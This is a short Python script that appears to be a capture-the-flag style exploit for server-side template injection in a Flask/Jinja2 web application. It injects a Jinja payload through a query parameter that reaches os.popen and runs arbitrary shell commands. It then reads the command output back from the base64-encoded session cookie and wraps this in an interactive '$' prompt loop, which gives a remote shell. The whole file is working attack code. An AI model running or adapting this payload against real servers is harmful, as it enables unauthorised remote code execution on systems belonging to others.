import json
import re
import requests
import sys

from base64 import b64decode as b64d


def pad_b64(string: str) -> str:
    return string + '=' * (-len(string) % 4)


def exec_cmd(host: str, cmd: str):
    params = {
        'name': '{% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) == 1 %}{% endif %}',
        'c': 'c',
        'cmd': cmd
    }

    res = requests.get(f'http://{host}', params)

    set_cookie = res.headers['Set-Cookie']
    session = re.findall(r'session=(.*?)\.', set_cookie)[0]

    try:
        content = json.loads(b64d(pad_b64(session)).decode())
        print(content['c'])
    except json.JSONDecodeError:
        print('Could not decode\n')


def main():
    hostname = sys.argv[1]

    while True:
        try:
            exec_cmd(hostname, input('$ '))
        except KeyboardInterrupt:
            exit()


if __name__ == '__main__':
    main()
